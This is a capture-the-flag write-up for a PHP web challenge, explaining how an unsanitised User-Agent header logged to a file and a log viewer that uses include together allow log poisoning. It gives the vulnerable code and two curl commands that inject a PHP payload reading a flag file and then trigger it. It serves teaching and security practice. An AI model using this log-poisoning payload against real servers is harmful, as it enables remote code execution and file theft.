# TrackMe

**Event:** September 2026 SkillBit Flash CTF
**Category:** web
**Flag:** `SkillBit{...}` (unique per deploy, see below)

---

## Overview

A PHP analytics dashboard logs every visitor: IP, User-Agent, Referer, URI,
all appended to `access.log`. A log viewer at `/logs.php` lets the site
owner read those logs back. The flavor text is doing a lot of work here: no
one has reviewed this code since it was installed.

## The vulnerability

`logs.php` renders a log file with `include` instead of a plain read:

```php
ob_start();
include $path;
$rendered = ob_get_clean();
```

`ob_get_clean()` and a later `htmlspecialchars()` make the *output* look
safe, but that's irrelevant — `include` already executed anything
PHP-shaped in the file before a single byte of output existed to escape.

Meanwhile `index.php` writes the raw `User-Agent` header straight into that
log, no sanitization at all:

```php
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '-';
// ...
$log .= "User-Agent: $ua\n";
file_put_contents(__DIR__ . "/logs/access.log", $log, FILE_APPEND);
```

::: pitfall
Escaping the *rendered* output of an `include` doesn't undo the `include`.
By the time `htmlspecialchars` runs, any `<?php ?>` block in the file has
already executed server-side — the escaping only protects a second read of
already-dead output, not the include itself.
:::

Put together, this is classic log poisoning: get attacker-controlled PHP
into a log file, then trigger the log viewer to `include` it.

## Exploit

The flag lives at `/flag-<random hex>.txt`, generated fresh at container
startup, so the payload needs to glob for it rather than hardcode a name.

**1. Poison the log** — send a request whose User-Agent is a PHP snippet:

```bash
curl -A '<?php $f=glob("/flag-*")[0]; echo file_get_contents($f); ?>' \
     http://target:8080/
```

**2. Trigger it** — view the log through the vulnerable include:

```bash
curl http://target:8080/logs.php?file=access.log
```

`logs.php` includes `access.log`, PHP executes the poisoned User-Agent line
in place, and the flag file's contents come back in the rendered page.

## Flag

The flag is injected per-deploy (`SkillBit{Fake_Flag_For_Testing}` is only
the placeholder baked into the source); the live instance returns the real
`SkillBit{...}` value through the poisoned log.
